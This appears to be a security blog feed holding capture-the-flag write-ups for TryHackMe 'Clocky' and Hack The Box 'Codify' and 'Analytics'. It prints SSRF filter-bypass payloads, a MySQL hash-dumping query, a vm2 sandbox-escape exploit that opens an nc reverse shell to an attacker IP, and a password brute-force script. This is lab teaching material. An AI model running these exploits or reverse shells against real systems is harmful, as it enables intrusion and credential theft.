<p>&ldquo;A <strong>Server-side Request Forgery (SSRF)</strong> vulnerability occurs when an attacker manipulates a <strong>server-side application</strong> into making <strong>HTTP requests</strong> to a domain of their choice. This vulnerability exposes the server to arbitrary external requests directed by the attacker.&rdquo; Source - <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" >hacktricks</a>

</p>
</blockquote>
<p>We can find plenty of payloads on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypassing-filters" target="_blank" >PayloadsAllTheThings</a>

. I used <code>http://127.0.0.1:80</code> but it fails and we get <code>Action not permitted</code> in the response, implying that there is a filter that we need to bypass.</p>
<p><img src="/images/THM-Clocky/SSRF.png" alt="SSRF test"></p>
<p>I found a SSRF cheat sheet <a href="https://highon.coffee/blog/ssrf-cheat-sheet/" target="_blank" >here</a>

 and the payload <code>http://0x7f000001/</code> works.</p>
<p><img src="/images/THM-Clocky/SSRF-payload.png" alt="SSRF working payload"></p>
<p>At the beginning of the source code you can see the comment to execute <code>datbase.sql</code>. We use that for the file name and get a hit with the value for the flag 4.</p>
<p><img src="/images/THM-Clocky/db-sql.png" alt="database.sql file comment"></p>
<p><img src="/images/THM-Clocky/flag4.png" alt="Flag 4"></p>
<pre tabindex="0"><code>THM{350020dc1a53e50e1e92bac2c35dd0a2}
</code></pre><p>After forwarding the request we get a file called <code>file.txt</code>.</p>
<hr>
<h2 id="flag-5">Flag 5</h2>
<blockquote>
<p>The hint for this flag is &ldquo;Have you gathered any usernames yet?&rdquo;</p>
</blockquote>
<p><code>file.txt</code> leaks the password <code>Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and the username <code>clocky_user</code>. The source code only mentions two other names <code>jane</code> and <code>clarice</code>.</p>
<p>After trying the password with the different users we are able to login via SSH with <code>clarice:Th1s_1s_4_v3ry_s3cur3_p4ssw0rd</code> and grab flag 5.</p>
<p><img src="/images/THM-Clocky/flag5.png" alt="Flag 5"></p>
<pre tabindex="0"><code>THM{e57dfa35e62d518cfd215dd7729d0877}
</code></pre><hr>
<h2 id="flag-6">Flag 6</h2>
<p>In <code>/home/clarice/app</code> we find the hidden file <code>.env</code> which reveals the database password <code>seG3mY4F3tKCJ1Yj</code>.</p>
<p><img src="/images/THM-Clocky/db-pwd.png" alt="database password"></p>
<p>The result of <code>ss -lntp</code> confirms that MySQL is running on the server.</p>
<p><img src="/images/THM-Clocky/services-intern.png" alt="Internal services running"></p>
<p>Using <code>clocky_user:seG3mY4F3tKCJ1Yj</code> we connect to MySQL.</p>
<pre tabindex="0"><code>mysql -u clocky_user -p
</code></pre><p>The <code>clocky</code> database only contains the credentials of the <code>administrator</code> user.</p>
<p>In the <code>mysql</code> database we find a <code>user</code> table.</p>
<p><img src="/images/THM-Clocky/mysql-db.png" alt="mysql database"></p>
<p>The query <code>select * from user</code> produced some illegible output.</p>
<blockquote>
<p>If you pay close attention, you can actually grab a password hash from the output but I doubt this is the intended way to get the flag.</p>
</blockquote>
<p><img src="/images/THM-Clocky/user-output.png" alt="sql query output"></p>
<p>In the output we repeatedly see <code>caching_sha2_password</code> which is an authentication plugin using sha256.</p>
<p>Searching <code>how to dump mysql sha256 hashes with caching_sha2_password?</code> on Google we find this <a href="https://github.com/hashcat/hashcat/issues/2305?source=post_page-----10e08ab0f1e9--------------------------------" target="_blank" >hashcat issue page</a>

 where we can find multiple queries to achieve our goal.</p>
<pre tabindex="0"><code>SELECT user, CONCAT(&#39;$mysql&#39;,LEFT(authentication_string,6),&#39;*&#39;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#39;*&#39;)) AS hash FROM user WHERE plugin = &#39;caching_sha2_password&#39; AND authentication_string NOT LIKE &#39;%INVALIDSALTANDPASSWORD%&#39;;
</code></pre><p><img src="/images/THM-Clocky/hashes-dump.png" alt="hashes dump"></p>
<p>The first <code>dev</code> password hash gives the password <code>armadillo</code>.</p>
<pre tabindex="0"><code>hashcat -m 7401 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p>Using the newly found password we are able to connect as root and grab flag 6 in <code>/root</code> and that&rsquo;s all of them!</p>
<p><img src="/images/THM-Clocky/flag6.png" alt="Flag 6"></p>
<p>This challenge was pretty interesting and I hope my write up was useful to you. I think knowing Python is becoming more and more valuable for technical security professionals and taking the time to learn it will probably pay massive dividends in the future. You can read Automate the Boring Stuff with Python by Al Sweigart for free <a href="http://automatetheboringstuff.com/2e/" target="_blank" >here</a>

.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Codify</title>
            <link>https://scorpiosec.com/posts/2024/04/htb-codify/</link>
            <pubDate>Fri, 05 Apr 2024 16:50:10 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/04/htb-codify/</guid>
            <description>Platform: Hack The Box Link: Codify Level: Easy OS: Linux Codify starts with a web application that offers a sandbox environment for testing Node.js code. It utilizes the vm2 library and employs a module whitelist for security. However, there is a vulnerability (CVE-2023-3214 ) in vm2 that can be exploited to break out of the sandbox and access the target system. This is followed by lateral movement to access another user account and obtain the user flag.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Codify" target="_blank" >Codify</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Codify starts with a web application that offers a sandbox environment for testing Node.js code. It utilizes the <a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" target="_blank" >vm2</a>

 library and employs a module whitelist for security. However, there is a vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32314" target="_blank" >CVE-2023-3214</a>

 ) in vm2 that can be exploited to break out of the sandbox and access the target system. This is followed by lateral movement to access another user account and obtain the user flag. Additionally, upon identifying a vulnerability in a script that we can run with elevated privileges, a custom brute force script is employed to obtain the root password.</p>
<p>Target IP address - <code>10.10.11.239</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Codify 10.10.11.239
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-21 20:19 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.239
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.051s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.52
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://codify.htb/
</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
</span></span><span style="display:flex;"><span>|_http-title: Codify
</span></span><span style="display:flex;"><span>Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.83 seconds
</span></span></code></pre></div><p>We find three ports open 22 (SSH), 80 (HTTP) and 3000 (Node.js). We are being redirected to <code>codify.htb</code> which I added to the <code>/etc/hosts</code>.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.239 codify.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website is a service to test Node.js code in a sandbox environment.</p>
<p><img src="/images/HTB-Codify/codify-website.png" alt="Codify Website"></p>
<p>Clicking <code>Try it now</code> brings up an editor where code can be run.</p>
<p><img src="/images/HTB-Codify/code-run.png" alt="Codify Sanbox Environment"></p>
<p>The platform uses a module whitelist for security purposes.</p>
<p><img src="/images/HTB-Codify/codify-limitations.png" alt="Codify Module Whitelist"></p>
<p>In the <code>About Us</code> section we learn that the <a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" target="_blank" >vm2</a>

 library is used.</p>
<p><img src="/images/HTB-Codify/codify-about.png" alt="Codify About Section"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>Researching for vm2 vulnerabilities, we find <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32314" target="_blank" >CVE-2023-3214</a>

 and a PoC can be found <a href="https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac" target="_blank" >here</a>

. The exploit allows us to escape the sandbox and obtain remote code execution (RCE).</p>
<p>After multiple failures, the search for a reverse shell leads to <a href="https://www.youtube.com/watch?v=_q_ZCy-hEqg&amp;ab_channel=0xdf" target="_blank" >this</a>

 old video of 0xdf where he explains <code>mkfifo / nc Reverse Shell</code>. Some mkfifo reverse shells are available <a href="https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/b76e6441-5999-45e4-949e-bd332cb21cce.xhtml" target="_blank" >here</a>

 and the first one ends up working. Below is the complete code.</p>
<blockquote>
<p>Don&rsquo;t forget to change the IP address and port number accordingly.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Javascript" data-lang="Javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">VM</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;vm2&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">vm</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">VM</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  const err = new Error();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  err.name = {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    toString: new Proxy(() =&gt; &#34;&#34;, {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      apply(target, thiz, args) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        const process = args.constructor.constructor(&#34;return process&#34;)();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        throw process.mainModule.require(&#34;child_process&#34;).execSync(&#34;rm -f /tmp/a; mkfifo /tmp/a; nc 10.10.14.13 9001 0&lt;/tmp/a | /bin/sh &gt;/tmp/a 2&gt;&amp;1; rm /tmp/a &#34;).toString();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      },
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }),
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  };
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  try {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    err.stack;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  } catch (stdout) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    stdout;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">vm</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">code</span>));
</span></span></code></pre></div><p>Initial access is achieved after running the code in the editor.</p>
<p><img src="/images/HTB-Codify/foothold.png" alt="Codify Foothold"></p>
<p>The shell can be upgraded by running the commands below.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><h3 id="lateral-movement">Lateral Movement</h3>
<p>Access to the <code>joshua</code> directory in <code>/home</code> is denied. It is owned by the user <code>joshua</code> which is our target for lateral movement.</p>
<p><img src="/images/HTB-Codify/access-denied.png" alt="Access to Joshua directory denied"></p>
<p>After running <code>linpeas</code> on the target, some interesting accessible files are found in the Apache web root directory.</p>
<p><img src="/images/HTB-Codify/Codify-intersting-files.png" alt="Files found by linpeas"></p>
<p>The file <code>tickets.db</code> in <code>/var/www/contact</code> contains the password hash for the user <code>joshua</code>.</p>
<p><img src="/images/HTB-Codify/pwd-hash.png" alt="User josua password hash"></p>
<p><code>hashid</code> reveals that it is a Blowfish hash.</p>
<p><img src="/images/HTB-Codify/hashid.png" alt="Hashid command results"></p>
<p>Using john to crack the hash, the password <code>spongebob1</code> is retrieved.</p>
<p><img src="/images/HTB-Codify/hash-cracked.png" alt="User Joshua password"></p>
<p>With the credentials <code>joshua:spongebob1</code> we can login via SSH and get the user flag <code>user.txt</code></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Running <code>sudo -l</code> reveals that the user <code>joshua</code> can run the script <code>mysql-backup.sh</code> as root.</p>
<p><img src="/images/HTB-Codify/sudo-l.png" alt="Sudo -l command results"></p>
<p>When we try to execute the script we get the prompt <code>Enter MySQL password for root:</code>.</p>
<p>This is the content of the script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DB_USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;root&#34;</span>
</span></span><span style="display:flex;"><span>DB_PASS<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/cat /root/.creds<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>BACKUP_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/backups/mysql&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read -s -p <span style="color:#e6db74">&#34;Enter MySQL password for </span>$DB_USER<span style="color:#e6db74">: &#34;</span> USER_PASS
</span></span><span style="display:flex;"><span>/usr/bin/echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $DB_PASS <span style="color:#f92672">==</span> $USER_PASS <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmed!&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        /usr/bin/echo <span style="color:#e6db74">&#34;Password confirmation failed!&#34;</span>
</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/mkdir -p <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>databases<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/mysql -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> -e <span style="color:#e6db74">&#34;SHOW DATABASES;&#34;</span> | /usr/bin/grep -Ev <span style="color:#e6db74">&#34;(Database|information_schema|performance_schema)&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> db in $databases; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    /usr/bin/echo <span style="color:#e6db74">&#34;Backing up database: </span>$db<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    /usr/bin/mysqldump --force -u <span style="color:#e6db74">&#34;</span>$DB_USER<span style="color:#e6db74">&#34;</span> -h 0.0.0.0 -P <span style="color:#ae81ff">3306</span> -p<span style="color:#e6db74">&#34;</span>$DB_PASS<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$db<span style="color:#e6db74">&#34;</span> | /usr/bin/gzip &gt; <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">/</span>$db<span style="color:#e6db74">.sql.gz&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;All databases backed up successfully!&#34;</span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;Changing the permissions&#34;</span>
</span></span><span style="display:flex;"><span>/usr/bin/chown root:sys-adm <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>/usr/bin/chmod <span style="color:#ae81ff">774</span> -R <span style="color:#e6db74">&#34;</span>$BACKUP_DIR<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#39;Done!&#39;</span>
</span></span></code></pre></div><p>The image below highlights the script vulnerability. In Bash, if the right side of the <code>==</code> operator in a conditional expression (within double square brackets <code>[[ ... ]]</code>) is not quoted, Bash performs pattern matching (also known as globbing) rather than interpreting it as a string.</p>
<p><img src="/images/HTB-Codify/script-vulnerability.png" alt="mysql-backup.sh script vulnerability"></p>
<p>For example if the password is <code>hello</code>, both <code>[[$DB_PASS == hello]]</code> and <code>[[$DB_PASS == h*]]</code> will match because <code>h*</code> is a pattern that matches any string starting with the letter <code>h</code>. Knowing this, bruteforcing the password becomes a viable solution.</p>
<blockquote>
<p>To fix this, you should quote the variable <code>$USER_PASS</code> in the comparison, like so: <code>if [[ $DB_PASS == &quot;$USER_PASS&quot; ]]; then</code>. This ensures that the value of <code>$USER_PASS</code> is treated as a string, not a pattern.</p>
</blockquote>
<p>Below is the Python script I used</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
</span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>next<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] initializing bruteforce script...&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] bruteforce in progress, please wait...&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> next<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> chars:
</span></span><span style="display:flex;"><span>                errorlevel<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;echo &#34;</span><span style="color:#f92672">+</span>password<span style="color:#f92672">+</span>i<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;* | sudo /opt/scripts/mysql-backup.sh &gt;/dev/null 2&gt;&amp;1&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> errorlevel<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                        password<span style="color:#f92672">=</span>password<span style="color:#f92672">+</span>i
</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">&#34;[+] new character found: &#34;</span><span style="color:#f92672">+</span>password)
</span></span><span style="display:flex;"><span>                        next<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>: next<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] process terminated, root password is: &#34;</span><span style="color:#f92672">+</span>password)
</span></span></code></pre></div><p>Here’s how it works:</p>
<ol>
<li>
<p>It imports the necessary modules: <code>string</code> for character sets and <code>os</code> for executing system commands.</p>
</li>
<li>
<p>It defines a character set <code>chars</code> that includes all ASCII letters (both lowercase and uppercase) and digits.</p>
</li>
<li>
<p>An empty string password is initialized to store the discovered password characters, and a flag (<code>next</code>) to control the loop.</p>
</li>
<li>
<p>It enters a while loop that continues as long as <code>next</code> is 1. Inside this loop:</p>
<ul>
<li>It iterates over each character <code>i</code> in <code>chars</code>.</li>
<li>For each character, it constructs a command that echoes the current password plus the character <code>i</code>, followed by a wildcard <code>*</code>, and pipes this to <code>sudo /opt/scripts/mysql-backup.sh</code>. The command is executed in a shell and its output is redirected to /dev/null to suppress it.</li>
<li>If the command succeeds (i.e., the exit status <code>errorlevel</code> is <code>0</code>), it means that the current <code>password</code> plus the character <code>i</code> is a prefix of the actual password. In this case, it appends <code>i</code> to password, prints a message to the console, and sets <code>next</code> to <code>1</code> to continue the loop.</li>
<li>If the command fails (i.e., the exit status <code>errorlevel</code> is non-zero), it means that the current <code>password</code> plus the character <code>i</code> is not a prefix of the actual password. In this case, it sets <code>next</code> to <code>0</code> to stop the loop after the current iteration.</li>
</ul>
</li>
<li>
<p>After the loop terminates, it prints a message to the console indicating that the process has terminated and displays the discovered password.</p>
</li>
</ol>
<p>After running the script, the root password is found to be <code>kljh12k3jhaskjh12kjh3</code>.</p>
<p><img src="/images/HTB-Codify/root-pwd.png" alt="mysql-backup.sh script vulnerability"></p>
<p>After switching to <code>root</code>, the root flag <code>root.txt</code> is found in <code>/root</code>.</p>
<p><img src="/images/HTB-Codify/root-flag.png" alt="mysql-backup.sh script vulnerability"></p>
<p>I enjoyed this challenge especially the code review part because it is one of my weakest skills. Having some scripting/programming knowledge in Bash and Python will always help as a security professional.</p>
<p>freeCodeCamp has a Bash Scripting Tutorial for Beginners <a href="https://www.youtube.com/watch?v=tK9Oc6AEnR4&amp;t=18s&amp;ab_channel=freeCodeCamp.org" target="_blank" >video</a>

 on their YouTube channel. If you prefer books <a href="https://www.amazon.com/Learning-bash-Shell-Programming-Nutshell/dp/0596009658" target="_blank" >Learning the bash Shell, 3rd Edition</a>

 and <a href="https://www.amazon.com/Linux-Command-Line-2nd-Introduction/dp/1593279523" target="_blank" >The Linux Command Line, 2nd Edition: A Complete Introduction</a>

 are my recommendations.</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Analytics</title>
            <link>https://scorpiosec.com/posts/2024/03/htb-analytics/</link>
            <pubDate>Sat, 23 Mar 2024 01:25:21 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/03/htb-analytics/</guid>
            <description>Platform: Hack The Box Link: Analytics Level: Easy OS: Linux Analytics features a Metabase instance, which is an open-source business intelligence software. The target is vulnerable to CVE-2023-38646 allowing command execution while unauthenticated. After enumerating the environment varialbles, SSH credentials are discovered and the root shell is gained via a kernel exploit.
Target IP Address - 10.10.11.233
Scanning nmap -sC -sV -oA nmap/Analytics 10.10.11.233 Results
Starting Nmap 7.94SVN ( https://nmap.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Analytics" target="_blank" >Analytics</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Analytics features a Metabase instance, which is an open-source business intelligence software. The target is vulnerable to CVE-2023-38646 allowing command execution while unauthenticated. After enumerating the environment varialbles, SSH credentials are discovered and the root shell is gained via a kernel exploit.</p>
<p>Target IP Address - <code>10.10.11.233</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Analytics 10.10.11.233
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-03-15 13:11 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.233
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.047s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://analytical.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.31 seconds
</span></span></code></pre></div><p>We are being redirected to <code>analytical.htb</code> which is added to the <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.233 analytical.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id="enumeration">Enumeration</h2>
<p>The website does not have anything interesting besides a login page that redirects me to <code>http://data.analytical.htb/</code>, I add the subdomain to my <code>/etc/hosts</code> file.</p>
<pre tabindex="0"><code>sudo echo &#34;10.10.11.233 data.analytical.htb&#34; | sudo tee -a /etc/hosts
</code></pre><p>Visiting the newly found subdomain leads to a login page for <a href="https://www.metabase.com/" target="_blank" >Metabase</a>

 which is an open-source business intelligence software.</p>
<p><img src="/images/HTB-Analytics/signin-Metabase.png" alt="Metabase login page"></p>
<p>None of the default credentials worked.</p>
<p><img src="/images/HTB-Analytics/Metabase-default-users.png" alt="Metabase default credentials"></p>
<p>Looking for Metabase vulnerabilities we find <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-19475/product_id-51231/Metabase-Metabase.html" target="_blank" >CVE-2023-38646</a>

 allowing attackers to execute commands even while unauthenticated.</p>
<p><img src="/images/HTB-Analytics/cve-2023-38646.png" alt="CVE-2023-38646"></p>
<p>A PoC for the exploit is found <a href="https://github.com/m3m0o/metabase-pre-auth-rce-poc/tree/main" target="_blank" >here</a>

.</p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>The <code>setup-token</code> is retrieved by going to <code>http://data.analytical.htb/api/session/properties</code>.</p>
<p><img src="/images/HTB-Analytics/Metabase-setup-token.png" alt="setup-token"></p>
